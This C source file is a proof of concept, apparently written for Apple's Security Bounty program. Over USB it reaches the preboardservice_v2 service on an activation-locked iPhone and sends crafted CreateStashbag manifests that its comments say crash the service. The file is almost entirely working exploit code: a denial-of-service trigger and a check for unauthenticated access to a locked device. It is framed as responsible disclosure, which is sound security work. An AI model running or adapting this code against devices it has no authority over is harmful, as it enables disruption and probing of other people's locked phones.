/*
 * 23-preboard-service-dos: preboardservice_v2 accessible and crashes on
 * crafted input on activation-locked iOS device.
 *
 * Apple Security Bounty research PoC.
 * Test device: iPhone 15 Pro (iPhone16,1), iOS 26.3 (23D127), personally
 * owned by the researcher and intentionally activation-locked for this
 * research. Not a general-purpose bypass tool -- this file demonstrates a
 * specific vulnerability for responsible disclosure to Apple under the
 * Apple Security Bounty Program (https://security.apple.com/bounty/).
 *
 * Companion writeup: submission/23-preboard-service-dos/finding.md
 *
 * Build: make
 * Run:   ./poc
 * Deps:  libimobiledevice-1.0, libplist-2.0
 *        macOS:  brew install libimobiledevice
 *        Linux:  apt install libimobiledevice-dev libplist-dev
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <arpa/inet.h>

#include <libimobiledevice/libimobiledevice.h>
#include <libimobiledevice/lockdown.h>
#include <plist/plist.h>

#define SERVICE_NAME  "com.apple.preboardservice_v2"
#define RECV_TIMEOUT  5000   /* ms */

/* plist wire protocol: 4-byte big-endian length + XML plist bytes */
static int send_plist(idevice_connection_t conn, plist_t msg)
{
    char    *xml = NULL;
    uint32_t xml_len = 0;
    plist_to_xml(msg, &xml, &xml_len);
    if (!xml) return -1;

    uint32_t net_len = htonl(xml_len);
    uint32_t sent = 0;
    idevice_connection_send(conn, (const char *)&net_len, 4, &sent);
    idevice_connection_send(conn, xml, xml_len, &sent);
    free(xml);
    return (sent == xml_len) ? 0 : -1;
}

static int recv_plist(idevice_connection_t conn, plist_t *out)
{
    uint32_t net_len = 0, received = 0;
    idevice_error_t err;

    err = idevice_connection_receive_timeout(conn, (char *)&net_len, 4,
                                             &received, RECV_TIMEOUT);
    if (err != IDEVICE_E_SUCCESS || received < 4) return -1;

    uint32_t len = ntohl(net_len);
    if (len == 0 || len > 131072) return -1;

    char *buf = calloc(1, len + 1);
    if (!buf) return -1;

    err = idevice_connection_receive_timeout(conn, buf, len, &received, RECV_TIMEOUT);
    if (err == IDEVICE_E_SUCCESS && received == len)
        plist_from_memory(buf, len, out, NULL);
    free(buf);
    return (*out) ? 0 : -1;
}

/* Returns: 0=alive, 1=crash/disconnect, 2=blocked/error */
static int probe(idevice_t dev, lockdownd_client_t ld,
                 const char *label, plist_t manifest)
{
    lockdownd_service_descriptor_t desc = NULL;
    lockdownd_error_t lerr = lockdownd_start_service(ld, SERVICE_NAME, &desc);

    if (lerr == LOCKDOWN_E_INVALID_SERVICE || !desc) {
        printf("  BLOCKED    [%-40s]  service invalid on locked device\n", label);
        if (desc) lockdownd_service_descriptor_free(desc);
        return 2;
    }
    if (lerr != LOCKDOWN_E_SUCCESS) {
        printf("  ERROR      [%-40s]  lockdownd err %d\n", label, lerr);
        if (desc) lockdownd_service_descriptor_free(desc);
        return 2;
    }

    idevice_connection_t conn = NULL;
    if (idevice_connect(dev, desc->port, &conn) != IDEVICE_E_SUCCESS || !conn) {
        printf("  ERROR      [%-40s]  idevice_connect failed\n", label);
        lockdownd_service_descriptor_free(desc);
        return 2;
    }
    lockdownd_service_descriptor_free(desc);

    /* Build CreateStashbag command with the manifest as a data blob */
    char    *mxml = NULL;
    uint32_t mlen = 0;
    plist_to_xml(manifest, &mxml, &mlen);

    plist_t cmd = plist_new_dict();
    plist_dict_set_item(cmd, "Command", plist_new_string("CreateStashbag"));
    if (mxml && mlen > 0)
        plist_dict_set_item(cmd, "Manifest", plist_new_data(mxml, mlen));
    free(mxml);

    send_plist(conn, cmd);
    plist_free(cmd);

    plist_t resp = NULL;
    int ret;
    if (recv_plist(conn, &resp) == 0 && resp) {
        char    *rxml = NULL;
        uint32_t rlen = 0;
        plist_to_xml(resp, &rxml, &rlen);
        /* Truncate to 120 chars for readability */
        if (rxml && rlen > 120) rxml[120] = '\0';
        printf("  ALIVE      [%-40s]  response: %s\n", label, rxml ? rxml : "(empty)");
        free(rxml);
        plist_free(resp);
        ret = 0;
    } else {
        printf("  CRASH      [%-40s]  connection lost / broken pipe\n", label);
        ret = 1;
    }

    idevice_disconnect(conn);
    return ret;
}

int main(void)
{
    idevice_t          dev = NULL;
    lockdownd_client_t ld  = NULL;

    printf("Connecting to activation-locked device via USB...\n");

    if (idevice_new_with_options(&dev, NULL, IDEVICE_LOOKUP_USBMUX) != IDEVICE_E_SUCCESS) {
        fprintf(stderr, "ABORT: no USB device found -- connect the iOS device via USB\n");
        return 2;
    }

    char *udid = NULL;
    idevice_get_udid(dev, &udid);
    printf("Device:  %s\n\n", udid ? udid : "(unknown)");
    free(udid);

    if (lockdownd_client_new(dev, &ld, "poc-23") != LOCKDOWN_E_SUCCESS) {
        fprintf(stderr, "ABORT: lockdownd connection failed\n");
        idevice_free(dev);
        return 2;
    }

    printf("Testing %s\n\n", SERVICE_NAME);

    /* Case 1: empty dict -- baseline, should not crash */
    plist_t empty = plist_new_dict();
    int r0 = probe(dev, ld, "empty dict (baseline)", empty);
    plist_free(empty);

    /* Case 2: ManifestVersion key only -- crashes service */
    plist_t mv = plist_new_dict();
    plist_dict_set_item(mv, "ManifestVersion", plist_new_uint(1));
    int r1 = probe(dev, ld, "ManifestVersion: 1", mv);
    plist_free(mv);

    /* Case 3: StashKey + ManifestVersion -- crashes service */
    plist_t sk = plist_new_dict();
    plist_dict_set_item(sk, "StashKey",        plist_new_string("bounty_poc_key"));
    plist_dict_set_item(sk, "ManifestVersion", plist_new_uint(1));
    int r2 = probe(dev, ld, "StashKey + ManifestVersion", sk);
    plist_free(sk);

    printf("\n");

    int accessible = (r0 != 2 || r1 != 2 || r2 != 2);
    int crashes    = (r1 == 1) + (r2 == 1);

    if (!accessible) {
        printf("NOT CONFIRMED -- service correctly blocked on this device/version\n");
        lockdownd_client_free(ld);
        idevice_free(dev);
        return 1;
    }

    printf("SERVICE ACCESSIBLE without authentication on locked device\n");
    if (crashes > 0)
        printf("FINDING CONFIRMED: %d crash(es) from crafted manifest input\n", crashes);
    else
        printf("PARTIAL: service accessible but no crash observed on this iOS version\n");

    lockdownd_client_free(ld);
    idevice_free(dev);
    return 0;
}
